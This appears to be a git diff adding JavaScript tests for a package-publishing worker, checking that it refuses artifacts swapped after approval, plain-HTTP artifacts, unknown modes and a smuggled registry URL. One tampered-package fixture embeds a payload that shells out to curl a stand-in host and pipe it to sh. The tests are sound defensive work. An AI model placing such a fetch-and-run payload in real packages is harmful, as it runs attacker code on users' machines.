@@ -125,3 +125,102 @@ test('worker binary fails when the one-time seed is wrong', { skip: !existsSync(
   assert.equal(out.error, 'approve_failed');
   assert.equal(reg.isPublished('mock-g', '1.0.0'), false);
 });
+
+// ----- direct publish mode -----
+
+async function artifact(tarball) {
+  const r = await fetch(`${reg.url}/-/mock/artifact`, {
+    method: 'POST',
+    headers: auth(CI),
+    body: JSON.stringify({ tarball: tarball.toString('base64') }),
+  });
+  assert.equal(r.status, 201);
+  return r.json();
+}
+
+test('artifacts are served without credentials and can be tampered with', async () => {
+  const bytes = makePackage('art-a', '1.0.0');
+  const { id, url } = await artifact(bytes);
+  const got = Buffer.from(await (await fetch(url)).arrayBuffer());
+  assert.equal(sha256(got), sha256(bytes));
+  const evil = makePackage('art-a', '1.0.0', 'evil();');
+  await fetch(`${reg.url}/-/mock/tamper-artifact/${id}`, { method: 'POST', body: JSON.stringify({ tarball: evil.toString('base64') }) });
+  const again = Buffer.from(await (await fetch(url)).arrayBuffer());
+  assert.equal(sha256(again), sha256(evil));
+});
+
+test('a stage-only credential cannot publish directly', async () => {
+  const r = await fetch(`${reg.url}/direct-a`, { method: 'PUT', headers: auth(CI), body: '{}' });
+  assert.equal(r.status, 403);
+  assert.equal((await fetch(`${reg.url}/direct-a`, { method: 'PUT', body: '{}' })).status, 401);
+});
+
+const workerEnvHttp = { KEYTURN_ALLOW_HTTP: '1' };
+
+test('worker publish mode publishes the approved artifact', { skip: !existsSync(workerBin) }, async () => {
+  const bytes = makePackage('direct-b', '1.0.0');
+  const { url } = await artifact(bytes);
+  const { code, out } = await runWorker(
+    { mode: 'publish', package: 'direct-b', version: '1.0.0', approved_hash: sha256(bytes), artifact_url: url },
+    workerEnvHttp,
+  );
+  assert.equal(out.error, null, out.detail);
+  assert.equal(code, 0);
+  assert.equal(out.published_hash, sha256(bytes));
+  assert.equal(sha256(reg.publishedTarball('direct-b', '1.0.0')), sha256(bytes));
+});
+
+test('worker publish mode publishes a scoped package', { skip: !existsSync(workerBin) }, async () => {
+  const bytes = makePackage('@acme/direct-c', '2.0.0');
+  const { url } = await artifact(bytes);
+  const { out } = await runWorker(
+    { mode: 'publish', package: '@acme/direct-c', version: '2.0.0', approved_hash: sha256(bytes), artifact_url: url },
+    workerEnvHttp,
+  );
+  assert.equal(out.ok, true, out.detail);
+  assert.equal(reg.isPublished('@acme/direct-c', '2.0.0'), true);
+});
+
+test('worker publish mode refuses an artifact swapped after approval', { skip: !existsSync(workerBin) }, async () => {
+  const bytes = makePackage('direct-d', '1.0.0');
+  const { id, url } = await artifact(bytes);
+  const approved = sha256(bytes);
+  const evil = makePackage('direct-d', '1.0.0', "require('child_process').exec('curl evil|sh')");
+  await fetch(`${reg.url}/-/mock/tamper-artifact/${id}`, { method: 'POST', body: JSON.stringify({ tarball: evil.toString('base64') }) });
+  const { code, out } = await runWorker(
+    { mode: 'publish', package: 'direct-d', version: '1.0.0', approved_hash: approved, artifact_url: url },
+    workerEnvHttp,
+  );
+  assert.equal(code, 2);
+  assert.equal(out.error, 'hash_mismatch');
+  assert.equal(reg.isPublished('direct-d', '1.0.0'), false);
+});
+
+test('worker publish mode reports a version that already exists', { skip: !existsSync(workerBin) }, async () => {
+  const bytes = makePackage('direct-e', '1.0.0');
+  const { url } = await artifact(bytes);
+  const req = { mode: 'publish', package: 'direct-e', version: '1.0.0', approved_hash: sha256(bytes), artifact_url: url };
+  assert.equal((await runWorker(req, workerEnvHttp)).out.ok, true);
+  const second = await runWorker(req, workerEnvHttp);
+  assert.equal(second.out.error, 'publish_failed');
+  assert.match(second.out.detail, /previously published/);
+});
+
+test('worker refuses plain http artifacts unless the operator allows them', { skip: !existsSync(workerBin) }, async () => {
+  const bytes = makePackage('direct-f', '1.0.0');
+  const { url } = await artifact(bytes);
+  const { out } = await runWorker({ mode: 'publish', package: 'direct-f', version: '1.0.0', approved_hash: sha256(bytes), artifact_url: url });
+  assert.equal(out.error, 'bad_input');
+  assert.equal(reg.isPublished('direct-f', '1.0.0'), false);
+});
+
+test('worker rejects an unknown mode and a smuggled registry', { skip: !existsSync(workerBin) }, async () => {
+  assert.equal((await runWorker({ mode: 'sudo' })).out.error, 'bad_input');
+  const bytes = makePackage('direct-g', '1.0.0');
+  const { url } = await artifact(bytes);
+  const r = await runWorker(
+    { mode: 'publish', package: 'direct-g', version: '1.0.0', approved_hash: sha256(bytes), artifact_url: url, registry_url: 'https://evil.test' },
+    workerEnvHttp,
+  );
+  assert.equal(r.out.error, 'bad_input');
+});
